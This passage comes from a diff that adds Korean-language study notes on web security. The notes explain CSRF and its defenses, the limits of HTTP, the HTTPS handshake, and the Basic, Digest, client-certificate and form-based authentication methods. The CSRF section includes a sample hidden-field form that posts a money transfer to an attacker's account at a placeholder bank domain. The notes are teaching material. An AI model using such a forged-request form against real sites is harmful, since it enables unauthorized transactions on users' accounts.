+      &lt;li&gt;CSRF (Cross-Site Request Forgeries) &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern&quot;&gt;위키&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;인증된 유저가 의도하지 않는 개인정보나 설정정보 공격자의 의도대로 갱신하게끔 강제하는 공격 (수동적 공격)&lt;/li&gt;
+          &lt;li&gt;영향
+            &lt;ul&gt;
+              &lt;li&gt;인증된 유저의 권한으로 설정 정보등을 갱신&lt;/li&gt;
+              &lt;li&gt;인증된 유저의 권한으로 상품을 구입&lt;/li&gt;
+              &lt;li&gt;인증된 유저의 권한으로 게시판에 글 작성&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;예시
+            &lt;ul&gt;
+              &lt;li&gt;은행 웹 사이트가 현재 로그인한 사용자가 다른 은행으로 돈을 보낼 수 있는 폼을 제공한다고 가정&lt;/li&gt;
+              &lt;li&gt;은행 웹사이트에 인증을 하고나서 로그아웃하지 않고 다른 나쁜 웹사이트에 접속&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;&amp;lt;form action=”https://bank.kr/transfer” method=”post”&amp;gt;&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;&amp;lt;input type=”hidden” name=”amount” value=”100.00″/&amp;gt;&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;&amp;lt;input type=”hidden” name=”accountNumber” value=”공격자계좌번호”/&amp;gt;&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;&amp;lt;input type=”submit” value=”이벤트 참가’/&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;피해자가 버튼을 누르는 순간 공격자의 계좌로 돈이 송금된다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;해결방법
+            &lt;ul&gt;
+              &lt;li&gt;Synchronizer token 패턴을 사용
+                &lt;ul&gt;
+                  &lt;li&gt;클라이언트 응답에 대해 세션쿠키와 더불어 랜덤하게 생성되는 토큰을 HTTP 파라매터로 제공&lt;/li&gt;
+                  &lt;li&gt;모든 클라이언트의 요청에 대해 토큰값과 서버에서 발급했던 토큰값을 비교한다&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;Referer Header를 통한 이전 페이지 확인&lt;/li&gt;
+              &lt;li&gt;Origin Header를 통한 요청페이지 확인&lt;/li&gt;
+              &lt;li&gt;Challenge-Response
+                &lt;ul&gt;
+                  &lt;li&gt;CAPTCHA&lt;/li&gt;
+                  &lt;li&gt;Re-Authentication (password)&lt;/li&gt;
+                  &lt;li&gt;One-time Token &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http-&quot;&gt;HTTP의 한계&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;HTTP 뿐만 아니라 암호하하지 않은 다른 프로토콜에서도 공통되는 문제점&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;평문(암호화 하지 않은) 통신이기 때문에 도청이 가능하다&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;TCP/IP는 도청 가능한 네트워크 (패킷 캡처[Wireshark]나 스니퍼 도구)
+        &lt;ul&gt;
+          &lt;li&gt;암호화된 통신에서도 패킷열람은 가능하다. 구조상 어쩔수 없는 문제&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;암호화로 도청을 피할 수 있다
+        &lt;ul&gt;
+          &lt;li&gt;통신 암호화 : HTTP에는 암호화 구조는 없지만 SSL이나 TLS라는 다른 프로토콜을 조합함으로서 안전한 통신로를 만들고 나서 HTTP 통신을 한다&lt;/li&gt;
+          &lt;li&gt;콘텐츠 암호화 : 통신하고 있는 콘텐츠의 내용 자체(메세지 바디)를 암호화 해 버린다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;통신상대를 확인하지 않기 때문에 위장이 가능하다&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Request를 보낸 서버가 정말로 URI에서 지정한 host인지, Response를 반환한 Client가 리퀘스트를 출력한 클라이언트인지 아닌지를 모른다
+        &lt;ul&gt;
+          &lt;li&gt;Request를 보낸 웹서버가 위장한 웹 서버일 우려가 있다&lt;/li&gt;
+          &lt;li&gt;Response를 보낸 클라이언트가 위장한 클라이언트일 우려가 있다&lt;/li&gt;
+          &lt;li&gt;의미없는 Request라도 수신하게 된다 (Dos 공격을 방지할 수 없다)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;해결방안 : 상대를 확인하는 증명서를 활용한다
+        &lt;ul&gt;
+          &lt;li&gt;SSL을 이용하면 상대를 확인할 수 있다.&lt;/li&gt;
+          &lt;li&gt;SSL은 암호화뿐만 아니라 상대를 확인하는 수단으로 증명서를 제공하고 있다&lt;/li&gt;
+          &lt;li&gt;증명서는 신뢰할 수 있는 제3자 기관에 의해 발행되는 것이기 때문에 서버나 클라이언트가 실재하는 사실을 증명한다&lt;/li&gt;
+          &lt;li&gt;증명서를 위조하는 것은 기술적으로 불가능에 가깝다. 통신 상대의 서버나 클라이언트가 가진 증명서를 확인함으로써 통신 상대가 내가 통신하고자 하는 상대인지 판단할 수 있다&lt;/li&gt;
+          &lt;li&gt;클라이언트는 통신을 개시할때 서버의 증명서를 확인한다 (신뢰할 수 있는 제 3자를 통해 확인)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;완전성을 증명할 수 없기 때문에 변조가 가능하다&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;완전성이란 정보의 정확성을 가리킨다. 그것을 증명할 수 없다는 것은 정보변조 유무를 파악할 수 없다는 것이다&lt;/li&gt;
+      &lt;li&gt;이와 같이 공격자가 도중에 Request, Response를 빼앗아 변조하는 공격을 중간자 공격 (Middle-in-the-Middle Attack)이라고 부른다&lt;/li&gt;
+      &lt;li&gt;변조를 방지하려면? : 확실하면서 편리한 방법은 현재로서 존재하지 않는다
+        &lt;ul&gt;
+          &lt;li&gt;MD5나 SHA-1 등의 해시 값을 확인하는 방법&lt;/li&gt;
+          &lt;li&gt;파일의 디지털 서명을 확인하는 방법&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;결국 HTTP + 암호화 + 인증 + 완전성 보호 = HTTPS 를 사용해야 한다&lt;/b&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;특정 웹서버나 특정 웹 클라이언트의 구현상의 약점(취약점 또는 Security Hole이라고 한다)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;https&quot;&gt;HTTPS&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;HTTPS = HTTP + SSL&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTPS는 새로운 Application Layer의  프로토콜이 아니다.&lt;/li&gt;
+      &lt;li&gt;HTTP 통신을 하는 인터페이스인 소켓 부분을 SSL(Secure Socket Layer)나 TLS(Transport Layer Security)라는 프로토콜로 대체하고 있는 것이다&lt;/li&gt;
+      &lt;li&gt;보통 HTTP는 직접 TCP와 통신하지만 SSL을 사용한 경우에는 HTTP는 SSL과 통신하고, SSL이 TCP와 통신하게 된다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;비대칭키 + 대칭키를 사용하는 하이브리드 암호 시스템&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;비대칭키는 안전하지만, 속도가 느리다.&lt;/li&gt;
+      &lt;li&gt;이런 단점을 해결하기 위해 최초 대칭키를 교환할때만 비대칭키를 사용.&lt;/li&gt;
+      &lt;li&gt;데이터를 송수신할때는 안전하게 교환된 대칭키를 이용해서 통신&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;공개키가 정확한지 아닌지를 증명하는 증명서&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;비대칭키 방식의 공개키를 최초에 전송할때, 전송하는 주체와 전송받는 주체를 확인하는 수단&lt;/li&gt;
+      &lt;li&gt;인증기관(CA;Certificate Authority)과 그 기관이 발행하는 공개키 증명서가 이용된다
+        &lt;ul&gt;
+          &lt;li&gt;서버 운영자가 인증기관에 공개키를 등록 (비용발생)&lt;/li&gt;
+          &lt;li&gt;인증기관의 비밀키로 서버의 공개키를 디지털 서명. 공개키 증명서를 작성, 등록&lt;/li&gt;
+          &lt;li&gt;사용자 요청에 대해 운영서버는 서버의 공개키 증명서(공개키+인증기관의 디지털 서명)를 전송&lt;/li&gt;
+          &lt;li&gt;전송받은 공개키 증명서를 입수하고, 디지털 서명을 인증기관의 공개 키로 검증, 검증되면 안전한 공개키를 전송받았다고 확신할 수 있다 (인증기관의 공개키는 사전에 브라우저에 내장되어 있다)&lt;/li&gt;
+          &lt;li&gt;서버의 공개키를 이용해서 통신&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;통신과정 (클라이언트 =&amp;gt; 서버, 클라이언트 &amp;lt;= 서버)&lt;/b&gt;&lt;/em&gt;
+    &lt;ol&gt;
+      &lt;li&gt;=&amp;gt; HandShake: ClientHello
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트가 메세지를 송신하면서 SSL 통신을 시작&lt;/li&gt;
+          &lt;li&gt;메세지에는 클라이언트가 제공하는 SSL의 버전을 지정&lt;/li&gt;
+          &lt;li&gt;암호 스위트(Cipher Suite)로 불리는 리스트(사용하는 암호화 알고리즘이나 키 사이즈 등) 등을 포함&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= HandShake: ServerHello
+        &lt;ul&gt;
+          &lt;li&gt;서버가 SSL 통신이 가능한 경우에는 Server Hello 메시지로 응답한다&lt;/li&gt;
+          &lt;li&gt;클라이언트와 같이 SSL 버전과 암호 스위트를 포함.&lt;/li&gt;
+          &lt;li&gt;서버의 암호 스위트 내용은 클라이언트에서 받은 암호 스위트의 내용에서 선택된 것이다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= HandShake: Certificate
+        &lt;ul&gt;
+          &lt;li&gt;서버가 Certificate 메시지를 송신한다. 메시지에는 공개키 증명서가 포함되어 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= HandShake: ServerHelloDone
+        &lt;ul&gt;
+          &lt;li&gt;서버가 Server Hello Done 메시지를 송신하여 최초의 SSL Negotiation 부분이 끝났음을 통지&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;=&amp;gt; HandShake: ClientKeyExchange
+        &lt;ul&gt;
+          &lt;li&gt;SSL의 최초 Negotiation이 종료되면 클라이언트가 Client Key Exchange 메시지로 응답&lt;/li&gt;
+          &lt;li&gt;메시지에는 통신을 암호화하는데 사용하는 Pre-Master Secret이 포함되어 있다. (대칭키)&lt;/li&gt;
+          &lt;li&gt;이 메시지는 공개키 증명서에서 꺼낸 공개키로 암호화되어 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;=&amp;gt; ChangeCipherSpec
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트는 Change Cipher Spec 메시지를 송신한다. &lt;/li&gt;
+          &lt;li&gt;이 메세지는 이 후의 통신은 암호키를 사용해서 진행한다는 것을 나타내고 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;=&amp;gt; HandShake: Finished
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트는 Finished 메시지를 송신한다&lt;/li&gt;
+          &lt;li&gt;이 메시지는 접속 전체의 체크 값을 포함하고 있다.&lt;/li&gt;
+          &lt;li&gt;Negotiation이 성공했는지 어떤지는 서버가 이 메시지를 올바르게 복호화할 수 있는지 아닌지가 결정된다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= ChangeCipherSpec
+        &lt;ul&gt;
+          &lt;li&gt;서버에서도 Change Cipher Spec 메시지를 송신한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= HandShake: Finished
+        &lt;ul&gt;
+          &lt;li&gt;서버에서도 Finished 메시지를 송신한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;=&amp;gt; Application Data (HTTP)
+        &lt;ul&gt;
+          &lt;li&gt;Application Layer의 프로토콜에 의한 통신&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&amp;lt;= Application Data (HTTP)&lt;/li&gt;
+      &lt;li&gt;=&amp;gt; Alert: warning, close notify
+        &lt;ul&gt;
+          &lt;li&gt;마지막에 클라이언트가 접속을 끊는다&lt;/li&gt;
+          &lt;li&gt;그 후에 TCP FIN 메시지를 보내 TCP 통신을 종료한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;이 흐름에 더해서 애플리케이션 계층의 데이터를 송신할 때에는 MAC(Message Authentication Code)라 부르는 Message Digest를 덧붙일 수도 있다. MAC을 이용해서 변조를 감지할 수 있어서 완전성 보호를 실현할 수 있다.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;SSL의 성능&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTPS는 서버, 클라이언트 모두 암호화와 복호화 처리가 필요하므로 CPU나 메모리 등의 하드웨어 리소스를 소비한다&lt;/li&gt;
+      &lt;li&gt;HTTP 통신에 비해서 SSL 통신만큼 네트워크 리소스를 더 소비한다. 통신처리에 시간이 걸린다(HTTP에 비해 2~100배)&lt;/li&gt;
+      &lt;li&gt;SSL Accelater Hardware를 통해 이 문제를 해결하기도 한다.
+        &lt;ul&gt;
+          &lt;li&gt;SSL을 처리하기 위한 전용 하드웨어로 소프트웨어로 SSL을 처리할 때보다 몇 배 빠른 계산을 할 수 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;인증&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;흔히 애플리케이션에 접근할 때 권한을 얻기 위하여 사용자들이 로그인하는 것을 Authentication(인증)이라고 한다. 
+&lt;br /&gt;
+즉 로그인을 통해 사용자에게 권한을 할당하는 과정을 인증이라고 생각하면 된다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;HTTP/1.1에서 이용할 수 있는 인증 방식에는 다음과 같은 것이 있다
+&lt;br /&gt;
+1.BASIC Authentication
+&lt;br /&gt;
+2.DIGEST Authentication
+&lt;br /&gt;
+3.SSL-Client Authentication
+&lt;br /&gt;
+4.FORM-BASE Authentication&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;BASIC Authentication&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTP/1.0에 구현된 인증방식으로 현재에도 일부 사용되고 있다&lt;/li&gt;
+      &lt;li&gt;웹서버와 대응하고 있는 클라이언트 사이에서 이루어지는 인증방식이다&lt;/li&gt;
+      &lt;li&gt;과정 (Client =&amp;gt; Server, Client &amp;lt;= Server)
+        &lt;ul&gt;
+          &lt;li&gt;=&amp;gt; Request 송신&lt;/li&gt;
+          &lt;li&gt;&amp;lt;= 상태코드 401로 응답해서 인증이 필요하다는 것을 전달
+            &lt;ul&gt;
+              &lt;li&gt;인증이 필요한 리소스에 리퀘스트가 있을 경우에는 서버는 상태코드 401과 함께 인증의 방식과(BASIC) Request-URI의 보호공간을 식별하기 위한 문자열(realm)을 WWW-Authenticate 헤더필드에 포함해서 Response를 &lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;HTTP/1.1 401 Authorization Required&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;WWW-Authenticate: Basic realm=&quot;input your id and password&quot;&lt;/code&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;=&amp;gt; 유저 ID와 PASSWORD를 Base64 형식으로 인코드한 것을 송신
+            &lt;ul&gt;
+              &lt;li&gt;상태코드 401을 받은 클라이언트는 Basic 인증을 위해서 유저 ID와 PASSWORD를 서버에 송신할 필요가 있다&lt;/li&gt;
+              &lt;li&gt;송신하는 문자열은 유저 ID와 PASSWORD를 콜론 “:”으로 연결한 문장을 Base64 형식으로 인코드한다&lt;/li&gt;
+              &lt;li&gt;예를들어 아이디가 “usm” 패스워드가 “pass”인 경우 “usm:pass”와 같이 문자열이 된다&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;GET / HTTP1.1&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;Authorization: Basic &#39;인코딩된문자열&#39;&lt;/code&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&amp;lt;= 인증 성공시에는 상태코드 200으로 응답하고, 실패했을 경우에는 다시 상태코드 401로 응답&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Basic 인증에서는 Base64 인코딩형식을 사용하고 있지만 이것은 암호화는 아니기 때문에 아무런 부가정보 없이도 복화하 할 수 있다. 즉, HTTPS 등에서 암호화되지 않은 통신 경로상에서 BASIC 인증을 해서 도청된 경우에는 복호화된 유저정보를 빼앗길 가능성이 있다&lt;/li&gt;
+      &lt;li&gt;BASIC 인증은 일반브라우저에서는 로그아웃할 수 없다는 문제도 있다.&lt;/li&gt;
+      &lt;li&gt;사용상의 문제와 많은 웹 사이트에서 요구되는 보안등급에는 미치지 못한다는 면에서 그다지 사용되고 있지는 않다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;DIGEST Authentication&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;BASIC Authentication의 약점을 보안하며 HTTP/1.1에 소개되어 있다.&lt;/li&gt;
+      &lt;li&gt;DIGEST 인증에는 Challenge Response 방식이 사용되고 있어서 BASIC 인증과 같이 패스워드를 있는 그대로 직접 보내는 일은 없다&lt;/li&gt;
+      &lt;li&gt;Challenge Response 방식은 최초에 상대방에게 인증요구를 보내고 상대방 측에서 받은 Challenge Code를 사용해서 Response 코드를 계산한다. 이 값을 상대에게 송신하여 인증을 하는 방법이다&lt;/li&gt;
+      &lt;li&gt;Response Code라는 패스워드와 Challenge 코드를 이용해서 계산한 결과를 상대에게 보내기 때문에 BASIC Authentication과 같은 방식에 비하면 패스워드가 누출될 가능성이 줄어든다&lt;/li&gt;
+      &lt;li&gt;과정 (Client =&amp;gt; Server, Client &amp;lt;= Server)
+        &lt;ul&gt;
+          &lt;li&gt;=&amp;gt; Request 송신&lt;/li&gt;
+          &lt;li&gt;&amp;lt;= 상태코드 401로 응답하는것과 함께 PASSWORD와 Challenge Code(nonce)를 송신
+            &lt;ul&gt;
+              &lt;li&gt;인증이 필요한 Resoure에 Request가 있을 경우에 서버는 상태코드 401 반환&lt;/li&gt;
+              &lt;li&gt;상태코드와 함께 Challenge Code(nonce)를 WWW-Authenticate 헤더필드에 포함해서 반환&lt;/li&gt;
+              &lt;li&gt;WWW-Authenticate  헤더필드에 반드시 포함되어야 하는 정보는 “realm”와 “nonce”  두개이다&lt;/li&gt;
+              &lt;li&gt;클라이언트가 이 값을 서버에 보내는것으로 인증한다&lt;/li&gt;
+              &lt;li&gt;nonce는 401 Response를 반환할 때마다 생성되는 유일한 문자열이다. 이 문자열은 Base64이거나 16진수가 권장되고 있다. 문자열의 내용에 관해서는 구현된 서버에 의존한다&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;HTTP/1.1 401 Authorization Request&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;WWW-Authenticate: Digest realm=&#39;문자&#39;, nonce=&#39;문자열&#39;, uri=&#39;&#39;, algorithm=MD5, qop=&#39;auth&#39;&lt;/code&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;=&amp;gt; 인증 성공시에는 상태코드 200으로 응답하고 실패했을 경우에는 다시 상태코드 401 응답
+            &lt;ul&gt;
+              &lt;li&gt;인증정보가 정확한 경우에는 Request-URI의 Resource를 포함한 Response를 반환한다&lt;/li&gt;
+              &lt;li&gt;이 때 서버는 Authentication-Info 헤더필드에 성공한 인증에 대한 몇가지 정보를 추가할 때도 있다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;DIGEST Authentication은 BASIC Authentication에 비해서 높은 보안 등급을 제공하고 있지만, HTTPS의 클라이언트 인증 등과 비교하면 낮다. DIGEST Authentication에서는 PASSWORD의 도청을 방지하기 위한 보호기능은 제공하고 있지만 이외에 위장을 방지하는 기능은 제공하고 있지 않다.&lt;/li&gt;
+          &lt;li&gt;DIGEST Authentication도 BASIC 인증과 마찬가지로 사용상의 문제와 많은 웹사이트에서 요구되는 보안 등급에는 미치지 못한다는 점에서 그다지 사용되고 있지 않다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;SSL-Client Authentication (공인인증서 방식)&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;유저 ID와 PASSWORD를 도난당했을 때에는 제 3자가 “위장”을 하는 경우가 있다.&lt;/li&gt;
+      &lt;li&gt;이를 방지하기 위한 대책 중의 하나로 SSL-Client Authentication이 사용되기도 한다&lt;/li&gt;
+      &lt;li&gt;클라이언트 증명서를 인증할 때에 사용하는 방식으로 사전에 등록된 클라이언트에서의 액세스인지 아닌지를 확인할 수 있다&lt;/li&gt;
+      &lt;li&gt;과정
+        &lt;ul&gt;
+          &lt;li&gt;인증이 필요한 Resource의 Request가 있었을 경우에 서버는 클라이언트에게 클라이언트 증명서를 요구하는 “Certificate Request”라는 메세지를 송신한다&lt;/li&gt;
+          &lt;li&gt;유저는 송신하는 클라이언트 증명서를 선택한다. 그리고 클라이언트는 클라이언트 증명서를 “Client Certificate”라는 메시지를 송신한다&lt;/li&gt;
+          &lt;li&gt;서버는 클라이언트 증명서를 검증하여 검증 결과가 정확하다면 클라이언트의 공개키를 취득한다. 그 이후에 HTTPS에 의한 암호를 개시한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;SSL-Client Authentication은 2-factor 인증에서 사용된다
+        &lt;ul&gt;
+          &lt;li&gt;단독으로 사용되지는 않고, Form-based Authentication과 합쳐서 사용된다&lt;/li&gt;
+          &lt;li&gt;2-factor 인증이란 패스워드와 같이 한 개의 요소만이 아닌 이용자가 가진 다른 정보를 병용한다는 뜻이다. 즉 SSL 클라이언트와 유저의 본인확인을 통해 본인이 올바른 컴퓨터에서 액세스하고 있음을 확인할 수 있다&lt;/li&gt;
+          &lt;li&gt;클라이언트 증명서를 이용하기 위해서는 비용이 필요하다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;FORM-BASED Authentication&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTP Protocol로서 사양이 정의되어 있는 인증방식은 아니다.&lt;/li&gt;
+      &lt;li&gt;클라이언트가 서버 상의 웹 어플리케이션에 자격정보(Credential)를 송신하여 그 자격정보의 검증결과에 따라 인증을 하는 방식이다.&lt;/li&gt;
+      &lt;li&gt;웹 어플리케이션에 따라 제공되는 인터페이스나 인증의 방법이 다양하다&lt;/li&gt;
+      &lt;li&gt;HTTP가 표준으로 제공하는  BASIC, DIGEST 인증은 사용상, 보안적 문제로 거의 사용되지 않는다. 그러나 웹 사이트의 인증기능으로서 요구되는 기능의 레벨을 충족시킨 표준적인 것이 존재하지 않기 때문에 웹 어플리케이션에서 제각각 구현하는 FORM-BASED 인증을 채용하는 수밖에 없다 &lt;/li&gt;
+      &lt;li&gt;대부분 세션 관리와 쿠키에 의한 구현에 의존한다 
+        &lt;ul&gt;
+          &lt;li&gt;세션ID가 제3자에 의해 악용되지 않도록 도난, 유추가 어렵도록 해야 한다
+            &lt;ul&gt;
+              &lt;li&gt;세션 ID는 추측하기 어려운 문자열을 사용&lt;/li&gt;
+              &lt;li&gt;서버측에서는 유효기한을 관리한다&lt;/li&gt;
+              &lt;li&gt;크로스 사이트 스크립팅 등의 취약성이 존재한 경우라도 피해를 줄이기 위해서 쿠키에는  httpOnly 속성을 부여해 둔다&lt;/li&gt;
+              &lt;li&gt;httponly는 클라이언트측 스크립트를 사용하여 쿠키에 액세스할 수 있는지 여부를 지정하는 값이다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;자격정보(Credential)를 교환하는 방법은 표준화되어 있지 않을 뿐 아니라, 패스워드 등의 자격정보를 서버 측에 어떻게 보존해야 하는지도 표준화되어 있지 않다
+        &lt;ul&gt;
+          &lt;li&gt;일반적으로 안전한 방법으로서 패스워드를 salt 부가 정보를 사용해서 해시 알고리즘으로 계산한 값을 저장하지만, 평문의 패스워드를 서버에 그대로 보존하고 있는 것도 자주 눈에 띈다. 이러한 곳에서는 패스워드가 노출될 위험이 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;hmac-&quot;&gt;HMAC 사전지식&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;들어가기에 앞서&lt;/p&gt;
+
+    &lt;ol&gt;
+      &lt;li&gt;
+        &lt;p&gt;Hashing : 키에서 주소로의 변환(key-to-address transformation)을 의미한다. 다른 검색 방법처럼 키값을 비교하면서 찾는 것이 아니라, 키값에 어떤 연산을 시행하여 이 키값이 있는 기억장소의 주소로 바로 접근하는 방법으로 직접 파일 구성에 이용된다. 해싱은 각 레코드의 키값을 비교해서 찾는 번거로움이 없고, 다른 검색방법보다 기억장소를 차지하지만 원하는 레코드를 단 한번의 접근으로 찾을 수 있는 장점이 있다. 그러나 모든 레코드의 키값을 수치 형태로 바꾸어야 하며, 적절한 해싱함수를 구해야 할 뿐만 아니라 계산된 주소의 충돌(collision) 문제를 해결해야 한다 &lt;em&gt;(출처 : &lt;a href=&quot;http://terms.naver.com/entry.nhn?docId=824742&amp;amp;cid=42344&amp;amp;categoryId=42344&quot;&gt;네이버 지식사전&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;Hash Algoritm : 하나의 문자열을 보다 빨리 찾을 수 있도록 주소에 직접 접근할 수 잇는 짧은 길이의 값이나 키로 변환하는 알고리듬. 해시 알고리듬을 함수로 표현한 것이 해시 함수이다 &lt;em&gt;(출처 : &lt;a href=&quot;http://terms.naver.com/entry.nhn?docId=858144&quot;&gt;네이버 지식사전&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
